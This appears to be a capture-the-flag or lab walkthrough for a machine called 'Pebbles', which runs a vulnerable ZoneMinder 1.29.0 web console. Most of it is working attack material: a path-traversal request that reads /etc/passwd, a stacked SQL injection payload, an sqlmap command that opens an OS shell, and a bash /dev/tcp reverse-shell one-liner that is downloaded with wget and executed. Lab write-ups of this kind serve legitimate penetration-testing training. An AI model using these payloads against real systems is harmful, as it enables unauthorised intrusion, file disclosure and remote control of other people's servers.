# Pebbles

### Enumeration

```
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-favicon: Unknown favicon MD5: 7EC7ACEA6BB719ECE5FCE0009B57206B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

ZoneMinder Console - Running - default v1.29.0

[https://vulners.com/packetstorm/PACKETSTORM:140927](https://vulners.com/packetstorm/PACKETSTORM:140927)

```
/zm/index.php?view=file&path=/../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
sally:x:1000:1000:Sally,,,:/home/sally:/bin/bash
```

[https://www.exploit-db.com/exploits/41239](https://www.exploit-db.com/exploits/41239)

```
2)SQL Injection
Example Url:http://192.168.241.131/zm/index.php
Parameter: limit (POST)
    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
    Payload: view=request&request=log&task=query&limit=100;(SELECT *
FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
Easy exploitable using sqlmap.
```

```
POST /zm/ HTTP/1.1
Host: 192.168.134.52
Content-Length: 73
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=ptbdk29oqfq3bk3cu8utbhsbm0
Connection: close 

view=request&request=log&task=query&limit=100&minTime=1466674406.084434


```

Saved as sqli.req

### Access

```
$ sqlmap -r sqli.req -p limit --dbms mysql --os-shell --technique S

S: Stacked queries

what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
os-shell>
```

Getting reverse shell

[https://www.revshells.com/](https://www.revshells.com) - Bash 196 - 443 port - Reverse Shell

```
shell---
0<&196;exec 196<>/dev/tcp/192.168.49.134/3305; /bin/bash <&196 >&196 2>&196

os-shell> wget http://192.168.49.134/shell
os-shell> bash shell
```
